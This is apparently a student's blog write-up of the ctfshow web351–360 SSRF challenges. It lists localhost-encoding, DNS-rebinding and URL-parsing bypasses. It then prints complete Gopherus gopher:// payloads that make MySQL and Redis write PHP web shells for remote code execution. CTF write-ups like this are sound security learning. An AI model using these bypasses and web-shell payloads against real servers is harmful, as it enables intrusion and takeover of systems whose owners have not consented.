---
title: "ctfshow SSRF"
description: "Notes from working through ctfshow web351–360 (SSRF)."
publishDate: "2026-03-11T23:02:34"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/ctfshow-ssrf/rooftop-amusement-park.jpg
  color: "#9F7E9B"
  alt: ctfshow SSRF
language: 'en'
draft: false
---

After a full day of classes, I came back to the dorm and went head-to-head with XSS, only to bow out in defeat in the end. In a fit of frustration, I did a little venting — but since it's come to this, let me post the SSRF ones first.

## web351-356

### Bypassing with IP address encodings

Decimal encoding: `http://2130706433`

Octal encoding: `http://0177.0000.0000.0001`

Hexadecimal encoding: `http://0x7f000001`

IPv6 address bypass: `http://[::1]`

Short address: `http://127.1`

Zero address: `http://0`

Bypassing via sites that resolve to `127.0.0.1`: `http://lvh.me` `http://customer-name.local.gd`

## web357

### Bypassing by crafting DNS names

By controlling DNS resolution, an attacker can point a custom domain at the target IP, bypassing a blacklist or whitelist.

#### (1) Custom domain resolution

The attacker registers a domain (such as `attacker.com`) and sets a DNS record pointing to `127.0.0.1` or an internal IP.

Example:

Original URL: `http://127.0.0.1`

Bypass URL: `http://spoofed.attacker.com`

#### (2) Subdomain crafting

The attacker can use a crafted subdomain to embed the target IP in the domain name. For example, `127.0.0.1.attacker.com` might resolve to `127.0.0.1`.

Example:

Bypass URL: `http://127.0.0.1.attacker.com`

#### (3) Services like nip.io

Services like `nip.io` let you generate domains of the form `127.0.0.1.nip.io` that resolve directly to the given IP, making it convenient for an attacker to test SSRF vulnerabilities.

Example:

Original URL: `http://127.0.0.1`

Bypass URL: `http://127.0.0.1.nip.io`

#### (4) DNS Rebinding

DNS rebinding bypasses a whitelist by dynamically changing the DNS resolution result. For example, the domain `attacker.com` initially resolves to a legitimate IP (such as `1.2.3.4`) and then switches to `127.0.0.1`.

Constructed using [rbndr.us](http://rbndr.us).

This tool lets you specify two IPs that alternate, via the subdomain.

How to set it up: go to [rbndr.us](http://rbndr.us) and set IP Address 1 to a public IP (such as `8.8.8.8`) and IP Address 2 to `127.0.0.1`.

Generated domain: it gives you a domain like [7f000001.08080808.rbndr.us](http://7f000001.08080808.rbndr.us).

Payload:

```text
url=http://7f000001.08080808.rbndr.us/flag.php
```

How it works in this challenge: the validation step and the later request resolve the name separately. If validation sees the public IP and the request sees `127.0.0.1`, the check can be bypassed; DNS caching and resolver behavior affect whether that happens.

Example:

Bypass URL: `http://attacker.com`

> **Redirection**
>
> `gethostbyname` — returns the IPv4 address corresponding to a hostname
>
> `filter_var` — filters a variable with a specified filter
>
> `FILTER_VALIDATE_IP` - validates whether it is a valid IP address
>
> `FILTER_FLAG_NO_PRIV_RANGE` - excludes private IP addresses
>
> `FILTER_FLAG_NO_RES_RANGE` excludes reserved IP addresses, such as the loopback address `127.0.0.1`
>
> Create a file `demo.php` on your own server
>
> ```php
> <?php header("Location: http://127.0.0.1/flag.php", true, 302);?>
> ```
>
> payload
>
> ```text
> url=http://xx.xx.xx.xx/demo.php
> ```

## web358

### Bypassing with special characters (@ and #)

The special characters `@` and `#` have specific meanings in URL parsing, and an attacker can exploit these to bypass whitelist or blacklist filtering.

#### (1) Using the @ character

In a URL, `@` separates the authentication info from the hostname. An attacker can craft a URL of the form `http://allowed.com@127.0.0.1` so that the server resolves to `127.0.0.1`, while the filter may only check `allowed.com`.

How it works:

URL format: `http://username:password@hostname`. The filter may validate only `allowed.com` and ignore the actual target `127.0.0.1` after the `@`.

Example:

Original URL: `http://127.0.0.1`

Bypass URL: `http://allowed.com@127.0.0.1`

Variant:

An encoded `@` (`%40`) may expose a decoding mismatch between validation and fetching; it is not equivalent to `@` in every URL parser.

Example: `http://allowed.com%40127.0.0.1`

Double encoding: `http://allowed.com%2540127.0.0.1`

#### (2) Using the # character

`#` denotes a URL fragment, which is usually used on the client side to locate a page anchor. Some servers ignore everything after `#` when handling a URL, so an attacker can place the target address before the `#`.

How it works:

A URL like `http://127.0.0.1#allowed.com` may be parsed as `127.0.0.1`, while the filter checks `allowed.com`.

Example:

Original URL: `http://127.0.0.1`

Bypass URL: `http://127.0.0.1#allowed.com`

Variant:

An encoded `#` (`%23`) only has the intended effect if the application decodes it at the relevant stage; a parser need not treat it as a fragment delimiter.

Example: `http://127.0.0.1%23allowed.com`

Double encoding: `http://127.0.0.1%2523allowed.com`

#### (3) Combining @ and #

An attacker can combine `@` and `#` to craft a more complex URL and further confuse the filter. For example, `http://allowed.com@127.0.0.1#bypass` may be parsed as `127.0.0.1`.

Example:

Bypass URL: `http://allowed.com@127.0.0.1#bypass`

Encoded variant: `http://allowed.com%40127.0.0.1%23bypass`

```text
url=http://ctf.127.0.0.1.nip.io/flag.php?show
```

`nip.io` ignores any prefix before the IP.

```text
url=http://ctf.@127.0.0.1/flag.php#show
```

In URL syntax, everything before the `@` symbol is treated as the "username and password". Many parsers (including `parse_url`) ignore this part and treat what comes after the `@` as the real Host (hostname). In the HTTP request the server makes, `#show` is not sent to the target server (the fragment is only parsed on the browser side).

## web359

The challenge description hints at attacking a password-less SQL setup. The page is a login form; capturing the request in Burp shows the POST body is `u=root&returl=https%3A%2F%2F404.chall.ctf.show%2F`, which locates the SSRF injection point. So I put root as the username, and for the password I used the gopherus tool to convert the payload:

```sql
select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php";
```

into a `gopher://` payload using Gopherus to achieve RCE.

```text
For making it work username should not be password protected!!!

Give MySQL username: root
Give query to execute: select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php";

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%50%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%22%3b%01%00%00%00%01
```

From the Burp capture, I know the payload above still has to be URL-encoded once before replaying.

RCE succeeds.

![web359, figure 1](../../blog/ctfshow-ssrf/images/image-6.png)

## web360

The challenge hints at attacking Redis, and the page displays its source code directly. This target uses the older, password-only authentication model; Redis 6 and later also support named users through ACLs.

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

Overall it's much like the previous challenge. Payload:

```text
Ready To get SHELL

What do you want?? (ReverseShell/PHPShell): PHPShell

Give web root location of server (default is /var/www/html):
Give PHP Payload (We have default PHP Shell): <?php eval($_POST['cmd']); ?>

Your gopher link is Ready to get PHP Shell:

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

This also needs to be URL-encoded once, and then RCE succeeds.

![web360, figure 1](../../blog/ctfshow-ssrf/images/web360-redis-rce.png)
